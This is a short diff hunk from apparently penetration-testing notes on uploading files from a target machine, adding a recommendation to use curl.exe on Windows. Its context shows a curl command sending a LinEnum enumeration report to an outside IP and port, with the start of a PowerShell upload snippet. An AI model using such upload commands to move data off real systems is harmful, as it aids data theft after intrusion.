@@ -23,6 +23,7 @@ curl -F filename=@LinEnum_report 10.10.14.23:8080
 
 ###Windows Powershell
 - Uploading via powershell depends on powershell version, check powershell.txt for more commands
+- I would Strongly recommend using curl.exe `https://curl.se/download.html`
 ```shell
 $Uri = 'http://localhost:8080/'
 $Form = @{
